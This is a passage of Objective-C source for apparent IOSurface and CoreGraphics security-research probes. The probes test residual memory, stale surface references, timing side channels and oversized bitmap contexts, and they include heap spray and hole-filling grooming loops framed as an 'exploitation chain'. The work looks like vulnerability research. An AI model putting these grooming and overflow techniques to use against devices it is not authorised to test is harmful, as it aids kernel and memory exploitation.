                    log([NSString stringWithFormat:@"IDORACLE: Residual 0xAAAAAAAA pixels = %d/4096", residualCount]);
                    if (residualCount > 0) {
                        anomalies++;
                        log(@"IDORACLE: ANOMALY — residual data persists after destroy+realloc!");
                    } else {
                        log(@"IDORACLE: Buffer properly zeroed on realloc");
                    }
                }
                sym.unlock(surfN2, 0, NULL);
                CFRelease(surfN2);
            }

            if (isr_stopped()) goto idoracle_done;

            // Phase C — Mass pre-lookup timing side-channel
            log(@"IDORACLE: Phase C — mass pre-lookup timing side-channel");
            {
                // Run 1: Create 100 surfaces WITHOUT pre-lookup
                uint64_t t1start = mach_absolute_time();
                for (int i = 0; i < 100; i++) {
                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                    if (s) CFRelease(s);
                }
                uint64_t t1end = mach_absolute_time();
                uint64_t noPreTime = t1end - t1start;

                // Get baseline for prediction
                IOSurfaceRef bSurf = sym.create((__bridge CFDictionaryRef)params);
                IOSurfaceID bID = sym.getID(bSurf);
                CFRelease(bSurf);

                // Pre-lookup 100 predicted IDs
                for (int i = 1; i <= 100; i++) {
                    IOSurfaceRef lr = sym.lookup(bID + i);
                    if (lr) CFRelease(lr);
                }

                // Run 2: Create 100 surfaces WITH pre-lookup priming
                uint64_t t2start = mach_absolute_time();
                for (int i = 0; i < 100; i++) {
                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                    if (s) CFRelease(s);
                }
                uint64_t t2end = mach_absolute_time();
                uint64_t withPreTime = t2end - t2start;

                mach_timebase_info_data_t info;
                mach_timebase_info(&info);
                double noPreNs = (double)noPreTime * info.numer / info.denom;
                double withPreNs = (double)withPreTime * info.numer / info.denom;
                double ratio = withPreNs / noPreNs;

                log([NSString stringWithFormat:@"IDORACLE: No pre-lookup = %.0fns, with pre-lookup = %.0fns, ratio = %.2fx",
                     noPreNs, withPreNs, ratio]);
                if (ratio > 1.5 || ratio < 0.67) {
                    anomalies++;
                    log([NSString stringWithFormat:@"IDORACLE: ANOMALY — pre-lookup causes %.0f%% timing difference!",
                         (ratio - 1.0) * 100.0]);
                } else {
                    log(@"IDORACLE: No significant timing side-channel from pre-lookup");
                }
            }

            if (isr_stopped()) goto idoracle_done;

            // Phase D — Stale reference persistence after destroy
            log(@"IDORACLE: Phase D — stale reference persistence");
            {
                IOSurfaceRef surfD = sym.create((__bridge CFDictionaryRef)params);
                IOSurfaceID idD = sym.getID(surfD);

                // Get second reference via lookup
                IOSurfaceRef refB = sym.lookup(idD);
                log([NSString stringWithFormat:@"IDORACLE: Surface id=%u, refA=%p, refB=%p", idD, surfD, refB]);

                // Write via A
                sym.lock(surfD, 0, NULL);
                void *dBase = sym.getBase(surfD);
                if (dBase) {
                    uint32_t *dpx = (uint32_t *)dBase;
                    for (int i = 0; i < 64*64; i++) dpx[i] = 0xCCCCCCCC;
                }
                sym.unlock(surfD, 0, NULL);

                // Destroy original reference A
                CFRelease(surfD);

                // Try to use stale reference B
                BOOL staleWorks = NO;
                if (refB) {
                    kern_return_t kr = sym.lock(refB, 0, NULL);
                    if (kr == 0) {
                        void *bBase = sym.getBase(refB);
                        if (bBase) {
                            uint32_t val = ((uint32_t *)bBase)[0];
                            log([NSString stringWithFormat:@"IDORACLE: Stale ref B reads 0x%08X after A destroyed", val]);
                            if (val == 0xCCCCCCCC) {
                                staleWorks = YES;
                                log(@"IDORACLE: Stale reference still has original data — refcount keeps surface alive");
                            }
                        }
                        sym.unlock(refB, 0, NULL);
                    } else {
                        log(@"IDORACLE: Stale ref B lock failed — surface properly freed");
                    }

                    // Create new surface — check if ID reused while B still holds a ref
                    IOSurfaceRef surfD2 = sym.create((__bridge CFDictionaryRef)params);
                    IOSurfaceID idD2 = sym.getID(surfD2);
                    log([NSString stringWithFormat:@"IDORACLE: New surface id=%u (old was %u, reused=%s)",
                         idD2, idD, idD2 == idD ? "YES" : "NO"]);

                    if (staleWorks && idD2 != idD) {
                        // B still valid, new surface got different ID — refcount protection works
                        log(@"IDORACLE: ID not reused while stale ref exists — kernel refcount protects");
                    } else if (staleWorks && idD2 == idD) {
                        anomalies++;
                        log(@"IDORACLE: ANOMALY — ID reused while stale reference still alive!");

                        // Check if B now sees D2's data
                        sym.lock(surfD2, 0, NULL);
                        void *d2Base = sym.getBase(surfD2);
                        if (d2Base) {
                            uint32_t *d2px = (uint32_t *)d2Base;
                            for (int i = 0; i < 64*64; i++) d2px[i] = 0xDDDDDDDD;
                        }
                        sym.unlock(surfD2, 0, NULL);

                        kr = sym.lock(refB, 0, NULL);
                        if (kr == 0) {
                            void *bBase2 = sym.getBase(refB);
                            if (bBase2) {
                                uint32_t bVal2 = ((uint32_t *)bBase2)[0];
                                log([NSString stringWithFormat:@"IDORACLE: Stale ref B now reads 0x%08X (D2 wrote 0xDDDDDDDD)", bVal2]);
                                if (bVal2 == 0xDDDDDDDD) {
                                    anomalies++;
                                    log(@"IDORACLE: CRITICAL — stale reference accesses NEW surface data!");
                                }
                            }
                            sym.unlock(refB, 0, NULL);
                        }
                    }

                    CFRelease(surfD2);
                    CFRelease(refB);
                }
            }

        idoracle_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"IDORACLE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-IDOracle-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Round 9: CG Overflow Exploitation Chain

static double shannon_entropy(const uint8_t *data, size_t len) {
    if (len == 0) return 0.0;
    uint32_t freq[256] = {0};
    for (size_t i = 0; i < len; i++) freq[data[i]]++;
    double ent = 0.0;
    for (int i = 0; i < 256; i++) {
        if (freq[i] == 0) continue;
        double p = (double)freq[i] / (double)len;
        ent -= p * log2(p);
    }
    return ent;
}

// Probe 28: CG Overflow Amplifier
void iosurface_research_cg_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            typedef size_t (*GetPlaneCountFn)(IOSurfaceRef);
            GetPlaneCountFn getPlaneCount = (GetPlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
            GetAllocSizeFn getAllocSize = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");
            typedef size_t (*GetPlaneBPRFn)(IOSurfaceRef, size_t);
            GetPlaneBPRFn getPlaneBPR = (GetPlaneBPRFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
            typedef size_t (*GetPlaneHFn)(IOSurfaceRef, size_t);
            GetPlaneHFn getPlaneH = (GetPlaneHFn)dlsym(sym.iosurface, "IOSurfaceGetHeightOfPlane");

            if (!getPlaneBase || !getPlaneCount) {
                log(@"CGOVF: Missing plane functions");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"missing plane fns"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            NSDictionary *p0Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *p1Info = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *dualPlane = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(32768),
                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
            };

            // Phase A — Plane layout analysis: verify contiguity and CG context creation
            log(@"CGOVF: Phase A — plane contiguity and CG bounds analysis");
            if (!isr_stopped()) {
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
                if (surf) {
                    sym.lock(surf, 0, NULL);
                    void *p0 = getPlaneBase(surf, 0);
                    void *p1 = getPlaneBase(surf, 1);
                    size_t allocSz = getAllocSize ? getAllocSize(surf) : 0;
                    size_t planeCount = getPlaneCount(surf);
                    if (p0 && p1) {
                        ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
                        log([NSString stringWithFormat:@"CGOVF: Plane gap = %td bytes, allocSize = %zu, planes = %zu", gap, allocSz, planeCount]);

                        // Write known patterns to each plane
                        uint32_t *px0 = (uint32_t *)p0;
                        uint32_t *px1 = (uint32_t *)p1;
                        for (int i = 0; i < 64*64; i++) px0[i] = 0xFFFF0000;
                        for (int i = 0; i < 64*64; i++) px1[i] = 0xFF00FF00;

                        // Read plane0 data safely via CG (within its own bounds only)
                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                        CGContextRef ctx = CGBitmapContextCreate(p0, 64, 64, 8, 256, cs,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (ctx) {
                            CGImageRef img = CGBitmapContextCreateImage(ctx);
                            if (img) {
                                log([NSString stringWithFormat:@"CGOVF: CG context for plane0 OK — w=%zu h=%zu bpr=%zu",
                                    CGImageGetWidth(img), CGImageGetHeight(img), CGImageGetBytesPerRow(img)]);
                                CGImageRelease(img);
                            }
                            CGContextRelease(ctx);
                        }

                        // Now test if CG ACCEPTS oversized height (without reading the image data)
                        CGContextRef ovfCtx = CGBitmapContextCreate(p0, 64, 128, 8, 256, cs,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (ovfCtx) {
                            anomalies++;
                            log(@"CGOVF: ANOMALY — CG accepted h=128 context on 64-row plane (no bounds check)!");
                            log([NSString stringWithFormat:@"CGOVF: This would allow reading %td bytes beyond plane0 into plane1", gap > 0 ? gap : 0]);
                            CGContextRelease(ovfCtx);
                        } else {
                            log(@"CGOVF: CG rejected h=128 — bounds validation present");
                        }

                        // Test extreme overflow h=192
                        CGContextRef extCtx = CGBitmapContextCreate(p0, 64, 192, 8, 256, cs,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (extCtx) {
                            anomalies++;
                            log(@"CGOVF: ANOMALY — CG accepted h=192 beyond allocSize!");
                            CGContextRelease(extCtx);
                        } else {
                            log(@"CGOVF: CG rejected h=192 — allocSize bounds check works");
                        }
                        CGColorSpaceRelease(cs);

                        // Direct memory comparison: can plane1 data be read from plane0's contiguous region?
                        if (gap == 16384) {
                            uint32_t *beyondP0 = (uint32_t *)((uint8_t *)p0 + 16384);
                            uint32_t p1Match = 0;
                            for (int i = 0; i < 64 && i < 16; i++) {
                                if (beyondP0[i] == 0xFF00FF00) p1Match++;
                            }
                            if (p1Match > 0) {
                                anomalies++;
                                log([NSString stringWithFormat:@"CGOVF: CRITICAL — plane1 data readable at plane0+offset! %u/16 match", p1Match]);
                                log(@"CGOVF: No page isolation between planes — contiguous in virtual memory");
                            }
                        }
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                }
            }

            if (isr_stopped()) goto cgovf_done;

            // Phase B — Format confusion: 8bpc vs 16bpc reinterpretation
            log(@"CGOVF: Phase B — 16bpc pixel format confusion");
            {
                NSDictionary *wide = @{
                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                    @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceBytesPerElement": @8,
                    @"IOSurfaceBytesPerRow": @512,
                    @"IOSurfaceAllocSize": @(512 * 64)
                };
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)wide);
                if (surf) {
                    sym.lock(surf, 0, NULL);
                    uint64_t *base = (uint64_t *)sym.getBase(surf);
                    size_t actualBPR = sym.getBytesPerRow(surf);
                    size_t actualAlloc = getAllocSize ? getAllocSize(surf) : 0;
                    if (base) {
                        for (int i = 0; i < 64*64; i++) base[i] = 0xDEADBEEFCAFEBABEULL;
                        log([NSString stringWithFormat:@"CGOVF: 16bpc surface — bpr=%zu alloc=%zu", actualBPR, actualAlloc]);

                        // CG reinterprets 8-byte pixels as two 4-byte pixels when width is doubled
                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                        CGContextRef ctx = CGBitmapContextCreate(base, 128, 64, 8, 512, cs,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (ctx) {
                            anomalies++;
                            log(@"CGOVF: ANOMALY — CG accepted w=128 on 64-wide 8bpe surface (pixel reinterpretation)!");
                            CGContextRelease(ctx);
                        } else {
                            log(@"CGOVF: CG rejected width reinterpretation");
                        }
                        CGColorSpaceRelease(cs);
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                }
            }

            if (isr_stopped()) goto cgovf_done;

            // Phase C — Multi-plane property analysis
            log(@"CGOVF: Phase C — multi-plane property enumeration");
            {
                uint32_t fmts[] = {0x42475241, 0x34323076, 0x34323266};
                NSString *fmtNames[] = {@"BGRA", @"420v", @"422f"};
                int planeCounts[] = {2, 2, 2};
                for (int f = 0; f < 3 && !isr_stopped(); f++) {
                    NSDictionary *pi0 = @{
                        @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                        @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                        @"IOSurfacePlaneBytesPerRow": @256
                    };
                    NSDictionary *pi1 = @{
                        @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
                        @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                        @"IOSurfacePlaneBytesPerRow": @128
                    };
                    NSDictionary *props = @{
                        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                        @"IOSurfacePixelFormat": @(fmts[f]),
                        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                        @"IOSurfaceAllocSize": @(20480),
                        @"IOSurfacePlaneInfo": @[pi0, pi1]
                    };
                    IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
                    if (surf) {
                        size_t pc = getPlaneCount(surf);
                        size_t as = getAllocSize ? getAllocSize(surf) : 0;
                        log([NSString stringWithFormat:@"CGOVF: Format %@ — kernel accepted: planes=%zu alloc=%zu", fmtNames[f], pc, as]);
                        if (pc == 2) {
                            void *b0 = getPlaneBase(surf, 0);
                            void *b1 = getPlaneBase(surf, 1);
                            if (b0 && b1) {
                                ptrdiff_t g = (uint8_t *)b1 - (uint8_t *)b0;
                                size_t h0 = getPlaneH ? getPlaneH(surf, 0) : 0;
                                size_t h1 = getPlaneH ? getPlaneH(surf, 1) : 0;
                                size_t bpr0 = getPlaneBPR ? getPlaneBPR(surf, 0) : 0;
                                size_t bpr1 = getPlaneBPR ? getPlaneBPR(surf, 1) : 0;
                                log([NSString stringWithFormat:@"CGOVF:   plane0: h=%zu bpr=%zu | plane1: h=%zu bpr=%zu | gap=%td", h0, bpr0, h1, bpr1, g]);
                                if (g > 0 && (size_t)g == h0 * bpr0) {
                                    log(@"CGOVF:   Planes contiguous — no guard page");
                                }
                            }
                        }
                        CFRelease(surf);
                    } else {
                        log([NSString stringWithFormat:@"CGOVF: Format %@ — kernel rejected mismatched planes", fmtNames[f]]);
                    }
                }
            }

            if (isr_stopped()) goto cgovf_done;

            // Phase D — Entropy of plane boundary region
            log(@"CGOVF: Phase D — boundary entropy analysis");
            {
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)dualPlane);
                if (surf) {
                    sym.lock(surf, 0, NULL);
                    void *p0 = getPlaneBase(surf, 0);
                    void *p1 = getPlaneBase(surf, 1);
                    if (p0 && p1) {
                        ptrdiff_t gap = (uint8_t *)p1 - (uint8_t *)p0;
                        // Only analyze within allocated bounds
                        size_t plane0Size = 64 * 256;
                        double entP0 = shannon_entropy((const uint8_t *)p0, plane0Size > 4096 ? 4096 : plane0Size);
                        double entP1 = shannon_entropy((const uint8_t *)p1, plane0Size > 4096 ? 4096 : plane0Size);
                        log([NSString stringWithFormat:@"CGOVF: Plane0 entropy=%.3f Plane1 entropy=%.3f gap=%td", entP0, entP1, gap]);
                        if (entP1 > 6.0) {
                            anomalies++;
                            log(@"CGOVF: ANOMALY — high entropy in plane1 suggests uninitialized/residual data");
                        }
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                }
            }

        cgovf_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"CGOVF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-CGOverflow-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

// Probe 29: Spray+CG Chain — safe version: no OOB CG contexts
void iosurface_research_spray_cg_chain(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            typedef size_t (*GetAllocSizeFn)(IOSurfaceRef);
            GetAllocSizeFn getAllocSize = (GetAllocSizeFn)dlsym(sym.iosurface, "IOSurfaceGetAllocSize");

            if (!getPlaneBase) {
                log(@"SPRAYCG: Missing getPlaneBase");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"missing plane fns"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;
            uint32_t groomHits = 0;
            uint32_t residualNonZero = 0;

            NSDictionary *fp0 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *fp1 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @32,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *holeFiller = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(16384 + 8192),
                @"IOSurfacePlaneInfo": @[fp0, fp1]
            };

            log(@"SPRAYCG: Starting 10 grooming iterations with safe analysis");
            for (int iter = 0; iter < 10 && !isr_stopped(); iter++) {
                // Spray 50 surfaces with known patterns
                IOSurfaceRef spray[50] = {0};
                NSDictionary *sp = isr_default_surface_params(64, 64);
                for (int i = 0; i < 50; i++) {
                    spray[i] = sym.create((__bridge CFDictionaryRef)sp);
                    if (spray[i]) {
                        sym.lock(spray[i], 0, NULL);
                        uint32_t *base = (uint32_t *)sym.getBase(spray[i]);
                        if (base) {
                            uint32_t pat = 0x41410000 | (uint32_t)i;
                            for (int j = 0; j < 64*64; j++) base[j] = pat;
                        }
                        sym.unlock(spray[i], 0, NULL);
                    }
                }

                // Free specific slots to create holes
                int holes[] = {10, 20, 30};
                for (int h = 0; h < 3; h++) {
                    if (spray[holes[h]]) {
                        CFRelease(spray[holes[h]]);
                        spray[holes[h]] = NULL;
                    }
                }

                // Fill holes with dual-plane surfaces
                IOSurfaceRef fillers[3] = {0};
                for (int h = 0; h < 3; h++) {
                    fillers[h] = sym.create((__bridge CFDictionaryRef)holeFiller);
                }

                // Safely analyze filler surfaces — read only within allocated bounds
                for (int h = 0; h < 3 && !isr_stopped(); h++) {
                    if (!fillers[h]) continue;
                    sym.lock(fillers[h], 0, NULL);
                    void *fP0 = getPlaneBase(fillers[h], 0);
                    void *fP1 = getPlaneBase(fillers[h], 1);
                    size_t fAlloc = getAllocSize ? getAllocSize(fillers[h]) : 0;
                    if (fP0 && fP1) {
                        ptrdiff_t fGap = (uint8_t *)fP1 - (uint8_t *)fP0;
                        // Read plane1 data within bounds to check for spray residue
                        uint32_t *p1Data = (uint32_t *)fP1;
                        size_t p1Words = 32 * 64; // plane1 is 64x32
                        for (size_t w = 0; w < p1Words && w < 2048; w++) {
                            if ((p1Data[w] & 0xFFFF0000) == 0x41410000) {
                                groomHits++;
                            }
                            if (p1Data[w] != 0) residualNonZero++;
                        }
                        if (iter == 0) {
                            log([NSString stringWithFormat:@"SPRAYCG: Filler %d — gap=%td alloc=%zu", h, fGap, fAlloc]);
                        }
                    }
                    sym.unlock(fillers[h], 0, NULL);
                }

                for (int h = 0; h < 3; h++) {
                    if (fillers[h]) CFRelease(fillers[h]);
                }
                for (int i = 0; i < 50; i++) {
                    if (spray[i]) CFRelease(spray[i]);
                }
            }

            if (groomHits > 0) {
                anomalies++;
                log([NSString stringWithFormat:@"SPRAYCG: CRITICAL — %u spray pattern words found in filler plane1!", groomHits]);
                log(@"SPRAYCG: Spray residue leaked across surface boundaries via heap reuse");
            } else {
                log(@"SPRAYCG: No spray pattern residue in filler planes");
            }

            log([NSString stringWithFormat:@"SPRAYCG: Plane1 non-zero words = %u (residual data indicator)", residualNonZero]);
            if (residualNonZero > 100) {
                anomalies++;
                log(@"SPRAYCG: ANOMALY — significant uninitialized/residual data in new plane allocations");
            }

            if (isr_stopped()) goto spraycg_done;

            // Phase B — Safe CG render of plane0 only, then direct plane1 memory read
            log(@"SPRAYCG: Phase B — CG render plane0 + direct plane1 read");
            {
                IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)holeFiller);
                if (surf) {
                    sym.lock(surf, 0, NULL);
                    void *sP0 = getPlaneBase(surf, 0);
                    void *sP1 = getPlaneBase(surf, 1);
                    if (sP0 && sP1) {
                        uint32_t *px0 = (uint32_t *)sP0;
                        for (int i = 0; i < 64*64; i++) px0[i] = 0xDDDDDDDD;

                        // Safe CG — only plane0 dimensions
                        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                        CGContextRef ctx = CGBitmapContextCreate(sP0, 64, 64, 8, 256, cs,
                            kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                        if (ctx) {
                            CGImageRef img = CGBitmapContextCreateImage(ctx);
                            if (img) {
                                CFDataRef pix = CGDataProviderCopyData(CGImageGetDataProvider(img));
                                if (pix) {
                                    const uint32_t *rendered = (const uint32_t *)CFDataGetBytePtr(pix);
                                    uint32_t match = 0;
                                    size_t nw = (size_t)CFDataGetLength(pix) / 4;
                                    for (size_t w = 0; w < nw && w < 4096; w++) {
                                        if (rendered[w] == 0xDDDDDDDD) match++;
                                    }
                                    log([NSString stringWithFormat:@"SPRAYCG: CG plane0 render match = %u/%zu", match, nw > 4096 ? (size_t)4096 : nw]);
                                    CFRelease(pix);
                                }
                                CGImageRelease(img);
                            }
                            CGContextRelease(ctx);
                        }
                        CGColorSpaceRelease(cs);

                        // Direct plane1 entropy
                        double p1Ent = shannon_entropy((const uint8_t *)sP1, 8192);
                        log([NSString stringWithFormat:@"SPRAYCG: Plane1 entropy = %.3f bits", p1Ent]);
                    }
                    sym.unlock(surf, 0, NULL);
                    CFRelease(surf);
                }
            }

        spraycg_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"SPRAYCG: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed),
                @"groomHits": @(groomHits),
                @"residualNonZero": @(residualNonZero)
            };
            isr_checkpoint(@"ISR-SprayCGChain-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

// Probe 30: Global+Overflow Combo
void iosurface_research_global_overflow(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");

            if (!getPlaneBase || !setValue) {
                log(@"GLOBALOVF: Missing functions");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"missing fns"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            NSDictionary *gp0 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *gp1 = @{
                @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *globalDual = @{
                @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(32768),
                @"IOSurfaceIsGlobal": @YES,
                @"IOSurfacePlaneInfo": @[gp0, gp1]
            };

            // Phase A — Create global dual-plane surface, write and verify via lookup
            log(@"GLOBALOVF: Phase A — global dual-plane surface + lookup tamper");
            if (!isr_stopped()) {
                IOSurfaceRef gSurf = sym.create((__bridge CFDictionaryRef)globalDual);
                if (gSurf) {
                    IOSurfaceID gID = sym.getID(gSurf);
                    log([NSString stringWithFormat:@"GLOBALOVF: Global surface ID=%u", gID]);

                    sym.lock(gSurf, 0, NULL);
                    void *ga0 = getPlaneBase(gSurf, 0);
                    void *ga1 = getPlaneBase(gSurf, 1);
                    if (ga0 && ga1) {
                        uint32_t *px0 = (uint32_t *)ga0;
                        uint32_t *px1 = (uint32_t *)ga1;
                        for (int i = 0; i < 64*64; i++) px0[i] = 0xAAAAAAAA;
                        for (int i = 0; i < 64*64; i++) px1[i] = 0xBBBBBBBB;

                        ptrdiff_t gap = (uint8_t *)ga1 - (uint8_t *)ga0;
                        log([NSString stringWithFormat:@"GLOBALOVF: Plane gap=%td contiguous=%s", gap, gap == 16384 ? "YES" : "NO"]);

                        // Direct contiguity check: read plane1 via plane0 offset
                        if (gap == 16384) {
                            uint32_t *crossRead = (uint32_t *)((uint8_t *)ga0 + 16384);
                            uint32_t p1Match = 0;
                            for (int i = 0; i < 16; i++) {
                                if (crossRead[i] == 0xBBBBBBBB) p1Match++;
                            }
                            if (p1Match > 0) {
                                anomalies++;
                                log([NSString stringWithFormat:@"GLOBALOVF: CRITICAL — plane1 data at plane0+offset: %u/16 match", p1Match]);
                            }
                        }
                    }
                    sym.unlock(gSurf, 0, NULL);

                    if (isr_stopped()) { CFRelease(gSurf); goto globalovf_done; }

                    // Phase B — Lookup and verify shared memory
                    log(@"GLOBALOVF: Phase B — lookup + cross-ref tamper detection");
                    IOSurfaceRef ref = sym.lookup(gID);
                    if (ref) {
                        sym.lock(ref, 0, NULL);
                        void *rp0 = getPlaneBase(ref, 0);
                        void *rp1 = getPlaneBase(ref, 1);
                        if (rp0 && rp1) {
                            // Verify lookup ref sees original data
                            uint32_t *rPx0 = (uint32_t *)rp0;
                            uint32_t *rPx1 = (uint32_t *)rp1;
                            uint32_t matchP0 = 0, matchP1 = 0;
                            for (int i = 0; i < 64*64; i++) { if (rPx0[i] == 0xAAAAAAAA) matchP0++; }
                            for (int i = 0; i < 64*64; i++) { if (rPx1[i] == 0xBBBBBBBB) matchP1++; }
                            log([NSString stringWithFormat:@"GLOBALOVF: Lookup ref — plane0 match=%u plane1 match=%u", matchP0, matchP1]);

                            if (matchP0 > 0 && matchP1 > 0) {
                                anomalies++;
                                log(@"GLOBALOVF: ANOMALY — both planes fully readable via IOSurfaceLookup (shared memory)");
                            }

                            // Tamper plane1 via lookup ref
                            for (int i = 0; i < 64*64; i++) rPx1[i] = 0xCCCCCCCC;
                        }
                        sym.unlock(ref, 0, NULL);

                        // Verify tamper visible on original
                        sym.lock(gSurf, 0, NULL);
                        void *origP1 = getPlaneBase(gSurf, 1);
